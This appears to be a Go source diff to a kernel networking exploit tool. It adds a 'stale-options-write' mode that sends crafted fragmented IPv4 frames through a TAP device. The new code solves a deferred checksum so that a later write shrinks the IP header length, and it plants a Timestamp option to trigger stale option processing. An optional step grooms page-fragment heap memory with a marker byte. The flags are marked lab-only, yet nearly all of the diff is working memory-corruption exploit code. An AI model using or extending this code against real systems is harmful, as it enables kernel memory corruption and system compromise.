@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"runtime"
 	"sort"
 	"syscall"
 	"time"
@@ -76,6 +77,10 @@ type cfg struct {
 	tcpSrcPort   int
 	tcpPort      int
 	tcpValid     bool
+	staleOptions bool
+	staleOptSkip int
+	staleOptLen  int
+	staleGroom   bool
 	csumOffset   int
 	csumWord     uint
 }
@@ -108,6 +113,10 @@ func parseCfg() cfg {
 	flag.IntVar(&c.tcpSrcPort, "tcp-source-port", 0x0100, "TCP source port (default bytes become NOP,END IPv4 options after mutation)")
 	flag.IntVar(&c.tcpPort, "tcp-port", 443, "destination port used by the TCP carrier")
 	flag.BoolVar(&c.tcpValid, "tcp-valid-checksum", false, "choose payload length and dual TCP checksums so TCP is valid before and after mutation")
+	flag.BoolVar(&c.staleOptions, "stale-options-write", false, "lab-only: shrink a parsed 60-byte IPv4 header and exercise stale option processing on short frag_list children")
+	flag.IntVar(&c.staleOptSkip, "stale-option-skip", 0, "lab-only: copied option bytes before the stale non-copied option (0 or 2..6)")
+	flag.IntVar(&c.staleOptLen, "stale-option-len", 40, "lab-only: bytes changed to IPOPT_NOOP by the stale option")
+	flag.BoolVar(&c.staleGroom, "stale-page-groom", false, "lab-only: seed one page-frag chunk with a 0x6b marker before the short child (exploratory)")
 	flag.IntVar(&c.csumOffset, "csum-offset", 0, "deferred checksum write offset from the IPv4 header start")
 	flag.UintVar(&c.csumWord, "csum-word", 0x004f, "desired host-endian 16-bit deferred checksum value")
 	egressWaitMs := flag.Int("egress-wait-ms", 5000, "time to collect ICMP quotations in egress mode")
@@ -177,6 +186,22 @@ func parseCfg() cfg {
 		fmt.Fprintln(os.Stderr, "-tcp-valid-checksum requires -egress -egress-transport tcp")
 		os.Exit(1)
 	}
+	if c.staleOptions && c.egress {
+		fmt.Fprintln(os.Stderr, "-stale-options-write is available only in the prepared TAP lab")
+		os.Exit(1)
+	}
+	if c.staleOptions && c.staleOptSkip != 0 && (c.staleOptSkip < 2 || c.staleOptSkip > 6) {
+		fmt.Fprintln(os.Stderr, "-stale-option-skip must be 0 or in 2..6")
+		os.Exit(1)
+	}
+	if c.staleOptions && (c.staleOptLen < 2 || c.staleOptSkip+c.staleOptLen > 40) {
+		fmt.Fprintln(os.Stderr, "-stale-option-len must be at least 2 and keep skip+len within 40")
+		os.Exit(1)
+	}
+	if c.staleGroom && (!c.staleOptions || !c.page) {
+		fmt.Fprintln(os.Stderr, "-stale-page-groom requires -stale-options-write -page")
+		os.Exit(1)
+	}
 	if c.transport == "tcp" && ((!c.egress && c.head+c.rest < 60) || (c.egress && c.head+c.egressRest < 60)) {
 		fmt.Fprintln(os.Stderr, "TCP egress transport requires at least 60 bytes of IPv4 payload")
 		os.Exit(1)
@@ -224,6 +249,9 @@ func run(c cfg) error {
 		return err
 	}
 	defer cap.Close()
+	if c.staleOptions {
+		return runStaleOptionsWrite(tap, cap, c)
+	}
 
 	if !c.skipVerify {
 		if err := verifyWrite(tap, cap, c); err != nil {
@@ -253,6 +281,125 @@ func run(c cfg) error {
 		}
 	}
 	return nil
+}
+
+func runStaleOptionsWrite(tap *os.File, cap *capture, c cfg) error {
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+	if c.staleGroom {
+		if err := writeTap(tap, stalePageGroomFrame(0x6b), false, 0, 0); err != nil {
+			return fmt.Errorf("stale-options: page groom: %w", err)
+		}
+		time.Sleep(50 * time.Millisecond)
+	}
+	const desired = uint16(0x0045) // network bytes 45 00: shrink IHL 15 to IHL 5
+	id := uint16(ipID)
+	headPayload := bytesRepeat(8, 0x31)
+	shortPayload := bytesRepeat(8, 0x42)
+	optionAt := c.staleOptSkip
+	if optionAt > 0 {
+		shortPayload[0] = 0x80 // copied unknown option: advance without memset
+		shortPayload[1] = byte(optionAt)
+	}
+	shortPayload[optionAt] = 0x44 // non-copied Timestamp option
+	shortPayload[optionAt+1] = byte(c.staleOptLen)
+	if end := optionAt + c.staleOptLen; end < len(shortPayload) {
+		shortPayload[end] = 0 // stop before interpreting filler as another option
+	}
+	finalPayload := bytesRepeat(128, 0x53)
+	allPayload := append(append(append([]byte(nil), headPayload...), shortPayload...), finalPayload...)
+	options := bytesRepeat(40, byte(1))
+	whole := ipv4PacketWithOptions(0, false, allPayload, id, options)
+	forwardTTL(whole)
+	adjust := len(whole) - len(finalPayload) + 32
+	if !solvePacketChecksumAt(whole, adjust, desired) {
+		return fmt.Errorf("stale-options: cannot solve deferred checksum word 0x%04x", desired)
+	}
+	copy(finalPayload[32:34], whole[adjust:adjust+2])
+
+	frames := [][]byte{
+		frameWithVLAN(ipv4PacketWithOptions(8, true, shortPayload, id, nil), c.vlanTags),
+		frameWithVLAN(ipv4PacketWithOptions(16, false, finalPayload, id, nil), c.vlanTags),
+	}
+	for _, f := range frames {
+		if err := writeTap(tap, f, true, uint16(l2LenForTags(c.vlanTags)+ipLen), 0); err != nil {
+			return err
+		}
+	}
+	head := frameWithVLAN(ipv4PacketWithOptions(0, true, headPayload, id, options), c.vlanTags)
+	if err := writeTap(tap, head, true, uint16(l2LenForTags(c.vlanTags)), 0); err != nil {
+		return err
+	}
+
+	pkts := cap.collect(c.capture, id)
+	fmt.Printf("stale-options: original_ihl=15 deferred_word=0x%04x option_skip=%d option_len=%d fragments=%d page=%t vlan_tags=%d\n",
+		desired, c.staleOptSkip, c.staleOptLen, len(pkts), c.page, c.vlanTags)
+	for i, ip := range pkts {
+		if len(ip) < ipLen {
+			continue
+		}
+		ihl := int(ip[0]&0x0f) * 4
+		off := int(binary.BigEndian.Uint16(ip[6:])&0x1fff) * 8
+		payloadEnd := min(len(ip), int(binary.BigEndian.Uint16(ip[2:])))
+		payload := []byte(nil)
+		if ihl <= payloadEnd {
+			payload = ip[ihl:payloadEnd]
+		}
+		fmt.Printf("  frag=%d ihl=%d offset=%d payload_len=%d payload_prefix=%s\n",
+			i, ihl, off, len(payload), hex.EncodeToString(payload[:min(16, len(payload))]))
+	}
+	if len(pkts) == 0 {
+		return errors.New("stale-options: no output fragments captured")
+	}
+	return nil
+}
+
+func stalePageGroomFrame(fill byte) []byte {
+	// With TUN_RX_PAD=64, a 3700-byte frame makes tun_build_skb request
+	// one 4096-byte chunk: ALIGN(3700+64, 64)+320. This seeds bytes that would
+	// overlap frags[0] if the short frame later reclaims the chunk at offset
+	// zero. It intentionally does not claim to exhaust task_frag: kernels using
+	// SKB_FRAG_PAGE_ORDER commonly cache a 32768-byte high-order page.
+	frame := bytesRepeat(3700, fill)
+	copy(frame[0:6], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x01})
+	copy(frame[6:12], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x02})
+	binary.BigEndian.PutUint16(frame[12:14], ethPExperiment)
+	return frame
+}
+
+func solvePacketChecksumAt(pkt []byte, adjust int, desired uint16) bool {
+	if adjust < 0 || adjust+1 >= len(pkt) {
+		return false
+	}
+	for w := 0; w < 65536; w++ {
+		pkt[adjust] = byte(w)
+		pkt[adjust+1] = byte(w >> 8)
+		if csumFold(csumPartial(pkt)) == desired {
+			return true
+		}
+	}
+	return false
+}
+
+func ipv4PacketWithOptions(offset int, more bool, payload []byte, id uint16, options []byte) []byte {
+	hlen := ipLen + len(options)
+	pkt := make([]byte, hlen+len(payload))
+	pkt[0] = 0x40 | byte(hlen/4)
+	binary.BigEndian.PutUint16(pkt[2:], uint16(len(pkt)))
+	binary.BigEndian.PutUint16(pkt[4:], id)
+	off := uint16(offset / 8)
+	if more {
+		off |= 0x2000
+	}
+	binary.BigEndian.PutUint16(pkt[6:], off)
+	pkt[8] = 64
+	pkt[9] = ipProtoRaw
+	copy(pkt[12:16], net.ParseIP("10.0.0.2").To4())
+	copy(pkt[16:20], net.ParseIP("10.99.0.2").To4())
+	copy(pkt[ipLen:hlen], options)
+	copy(pkt[hlen:], payload)
+	binary.BigEndian.PutUint16(pkt[10:], ipChecksum(pkt[:hlen]))
+	return pkt
 }
 
 func verifyWrite(tap *os.File, cap *capture, c cfg) error {
